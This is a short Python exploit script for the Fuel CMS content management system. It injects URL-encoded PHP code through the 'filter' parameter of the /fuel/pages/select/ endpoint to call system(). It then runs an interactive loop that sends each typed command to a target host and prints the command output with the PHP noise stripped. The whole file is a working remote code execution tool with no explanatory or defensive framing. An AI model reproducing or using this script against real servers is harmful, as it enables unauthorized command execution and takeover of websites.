#!/usr/bin/env python3

import requests
import urllib.parse

victim = "http://127.0.0.1" #change this 



def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	cmd = input('$ ')
	exploit_url = victim+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.parse.quote(cmd)+"%27%29%2b%27"
	r = requests.get(exploit_url)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	#prevent the annoying "system" output from older version
	output = r.text[6:dup].split("\n")
	for line in output:
		line = line.strip()
		#prevent warnings thrown by php
		if not line.startswith("<") and not line.endswith(">") and line!='':
			print(line)  
